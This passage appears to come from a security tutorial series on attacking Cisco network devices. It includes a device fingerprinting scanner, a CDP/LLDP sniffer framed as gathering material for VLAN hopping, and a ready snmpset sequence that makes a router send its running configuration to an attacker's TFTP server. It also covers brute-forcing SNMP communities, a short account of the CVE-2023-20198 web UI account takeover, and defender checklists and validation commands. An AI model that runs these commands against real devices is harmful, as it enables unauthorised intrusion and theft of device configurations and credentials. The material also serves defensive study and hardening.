    group.add_argument("--subnet", help="Subnet in CIDR notation (e.g., 10.0.0.0/24)")
    ap.add_argument("--workers", type=int, default=16, help="Number of concurrent scans")
    ap.add_argument("--out", help="JSON path to save results")
    args = ap.parse_args()

    # Build target list
    if args.subnet:
        targets = [str(ip) for ip in ipaddress.ip_network(args.subnet, strict=False).hosts()]
    else:
        targets = [args.ip]

    results: list[DeviceProfile] = []
    # ThreadPoolExecutor is well-suited for socket blocking I/O with minimal GIL impact
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        for profile in ex.map(scan_one, targets):
            # Skip devices with no open ports — reduces noise
            if profile.open_ports:
                results.append(profile)
                print(f"[{profile.ip:15}] {profile.os_guess:8} "
                      f"ver={profile.version_guess or '?':12} "
                      f"ports={profile.open_ports}")

    # JSON output is optional — enable for CI/report automation
    if args.out:
        with open(args.out, "w") as f:
            json.dump([asdict(p) for p in results], f, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    main()
```

**Field tips**:
- In the SSH banner `SSH-2.0-Cisco-1.25`, the `Cisco-1.25` part is the internal version of the IOS SSH implementation. This value can narrow down the IOS major version.
- SNMP `sysDescr` typically looks like `"Cisco IOS Software, C2800 Software (C2800NM-ADVIPSERVICESK9-M), Version 12.4(24)T1, RELEASE SOFTWARE"` — **just this one line is enough to immediately narrow down the list of exploitable CVEs**.

## 5. CDP/LLDP — A Gold Mine Visible Only to Insiders

If you're on a node connected to a switch port, simply waiting for **CDP** (Cisco Discovery Protocol) or **LLDP** frames will yield enormous amounts of information.

- Device model, IOS version, IP, default VLAN
- Native VLAN ID → material for VLAN hopping attacks
- Interface descriptions set by administrators → hints about network topology

```python
#!/usr/bin/env python3
"""cdp_lldp_sniffer.py — Extracts information from CDP/LLDP frames on a switch port."""
from __future__ import annotations

import argparse                                           # CLI arguments
from scapy.all import sniff, Ether                        # Basic packet capture
from scapy.contrib.cdp import CDPv2_HDR, CDPMsgDeviceID, \
    CDPMsgSoftwareVersion, CDPMsgPlatform, CDPMsgPortID, \
    CDPMsgNativeVLAN                                      # CDP TLV parsing
from scapy.contrib.lldp import LLDPDUSystemName, \
    LLDPDUSystemDescription, LLDPDUChassisID              # LLDP TLV parsing


def handle_cdp(pkt) -> None:
    """Selects and prints only relevant TLVs from a CDP frame.
    CDP is sent to multicast 01:00:0c:cc:cc:cc with a default 60-second interval."""
    if not pkt.haslayer(CDPv2_HDR):
        return
    # Check for each TLV — they may not be present, so use getlayer
    device = pkt[CDPMsgDeviceID].val.decode(errors="ignore") if pkt.haslayer(CDPMsgDeviceID) else "?"
    version = pkt[CDPMsgSoftwareVersion].val.decode(errors="ignore") if pkt.haslayer(CDPMsgSoftwareVersion) else "?"
    platform = pkt[CDPMsgPlatform].val.decode(errors="ignore") if pkt.haslayer(CDPMsgPlatform) else "?"
    port = pkt[CDPMsgPortID].iface.decode(errors="ignore") if pkt.haslayer(CDPMsgPortID) else "?"
    # Native VLAN ID — critical value for VLAN hopping attacks
    nvlan = pkt[CDPMsgNativeVLAN].vlan if pkt.haslayer(CDPMsgNativeVLAN) else "?"

    print(f"[CDP]  {device}  port={port}  platform={platform}  native_vlan={nvlan}")
    # Software version is long, so print on a separate line
    print(f"       {version.splitlines()[0] if version else '?'}")


def handle_lldp(pkt) -> None:
    """LLDP is a standard protocol and is captured even in heterogeneous environments.
    Sent from multicast 01:80:c2:00:00:0e."""
    if not pkt.haslayer(LLDPDUChassisID):
        return
    sysname = pkt[LLDPDUSystemName].system_name.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemName) else "?"
    sysdesc = pkt[LLDPDUSystemDescription].description.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemDescription) else "?"
    print(f"[LLDP] {sysname}")
    print(f"       {sysdesc[:120]}")


def dispatcher(pkt) -> None:
    """Routes CDP/LLDP to a single callback since both are of interest."""
    if pkt.haslayer(CDPv2_HDR):
        handle_cdp(pkt)
    elif pkt.haslayer(LLDPDUChassisID):
        handle_lldp(pkt)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True, help="Network interface to capture on (e.g., eth0)")
    ap.add_argument("-c", "--count", type=int, default=0, help="0=unlimited, N=stop after N packets")
    args = ap.parse_args()

    # BPF filter on Ethernet dst multicast addresses reduces CPU load
    bpf = "(ether dst 01:00:0c:cc:cc:cc) or (ether dst 01:80:c2:00:00:0e)"
    print(f"[*] Sniffing {args.iface} for CDP/LLDP (filter: {bpf})")
    sniff(iface=args.iface, prn=dispatcher, filter=bpf, count=args.count, store=False)


if __name__ == "__main__":
    main()
```

CDP frames are sent every 60 seconds by default, so sitting for just 1-2 minutes gives you a clear picture of the surrounding switch topology.

**Defender advice**: Disable CDP/LLDP on unnecessary ports.
```
! Even disabling only on externally-facing interfaces has significant effect
interface GigabitEthernet0/1
 no cdp enable
 no lldp transmit
 no lldp receive
```

## 6. Remote Configuration File Retrieval Paths

### 6.1 Exfiltrating Config via TFTP Using SNMP Write Community

If there is a **write** community string in SNMPv1/v2c, you can dump the entire device configuration to an external TFTP server. This classic technique — more than a decade old — still succeeds frequently.

```bash
# 1) Start attacker's TFTP server (Kali example)
sudo apt install tftpd-hpa
sudo systemctl start tftpd-hpa
# Default directory /srv/tftp, make writable with chmod 777 /srv/tftp

# 2) SNMP SET instructs the device to push running-config to TFTP (requires write community)
#    OID .1.3.6.1.4.1.9.9.96 is CISCO-CONFIG-COPY-MIB
TARGET=10.0.0.1
TFTP_SRV=10.0.99.99
COMMUNITY=private                 # In real environments, brute-force to find this

# Each OID's meaning is annotated below
snmpset -v 2c -c $COMMUNITY $TARGET \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.2.101 i 1  `# ProtocolType = TFTP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.3.101 i 4  `# SourceType    = running-config` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.4.101 i 1  `# DestType      = networkFile` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.5.101 a $TFTP_SRV  `# TFTP server IP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.6.101 s cfg.txt    `# Destination filename` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.14.101 i 1 `# Action = active (start operation)`

# 3) running-config is now available at /srv/tftp/cfg.txt
```

### 6.2 HTTP/HTTPS Web UI Vulnerabilities (IOS XE Only)

When authentication bypass is possible as in CVE-2023-20198, a single POST to endpoints like `/webui/logoutconfirm.html?logon_hash=1` can **create a privilege level 15 account**. In late 2023, attackers planted backdoor accounts on tens of thousands of public-facing routers, and unpatched devices are still findable on Shodan today.

The defense is simple — **disable the HTTP/HTTPS server on external interfaces**.

```
no ip http server
no ip http secure-server
```

## 7. Reconnaissance Stage Checklist

Both attackers and defenders check the following first.

**Attacker**:
- [ ] Scan TCP 22/23/80/443/830, UDP 161
- [ ] Dictionary-attack SNMP communities: `public/private/cisco/manager/secret`
- [ ] Obtain OS version from SSH banner and sysDescr
- [ ] Sniff CDP/LLDP to identify management VLAN and neighboring devices
- [ ] Confirm Web UI presence → search for recent CVEs
- [ ] Check whether outbound TFTP server traffic is possible (config exfiltration path)

**Defender**:
- [ ] Isolate management plane in a **separate VRF** or dedicated management VLAN
- [ ] Allow only SNMPv3 with ACLs even on read communities
- [ ] Disable Web UI; if required, restrict access to management network only
- [ ] Enforce SSH protocol v2; use public-key authentication instead of passwords
- [ ] Enable CDP/LLDP only on trunk and internal links
- [ ] Include legal warning text in login banners (no technical effect, but useful for post-incident legal action)

## 8. Conclusion

Once you have a solid understanding of the OS lineage, filesystem, management ports, and fingerprinting, subsequent sections (02–04) become much clearer — **"which scenario runs on which device and which management plane"**. Network device attacks are classic, but as the 2025 CVE lists confirm, they remain among the most rapidly profitable targets.

The next document (02) builds on this information to cover **Layer 2 attacks** — how to cross VLAN boundaries and deceive switches within the same broadcast domain.

<!-- detect-validate-32 -->
## Network Device Recon Detection and Defense Validation

Device recon targets *default SNMP communities, exposed management services, banner leakage, and old IOS CVEs*. Defenders must verify **whether their device's exposure and management access are controlled**. Validate only on **owned devices/networks**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| SNMP recon (public/private) | Default community | Change community, SNMPv3 | public/private responds |
| Exposed mgmt (telnet/http) | Plaintext management | SSH/HTTPS, ACL | 23/80 responds externally |
| Banner/version leakage | Info disclosure | Remove banners | Version banner exposed |
| Old IOS known CVE | Unpatched | Firmware update | Vulnerable version |

### Defense validation (verify directly)

```bash
# 1) Check your device's exposed management services (owned network) — telnet/http/SNMP
nmap -sU -sT -p T:23,80,443,22,U:161 192.168.1.1 2>/dev/null | grep -iE "open|snmp|telnet"
# 2) Check SNMP default-community response — public/private means recon exposure
snmpwalk -v2c -c public 192.168.1.1 system 2>/dev/null | head
```

> Device-recon defense is *whether the exposure is narrow and management is controlled* -- "the device works" differs from "telnet is closed and SNMP doesn't answer to default communities". Confirm exposed services and SNMP response on owned networks directly ([[02_Network_Hacking]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).
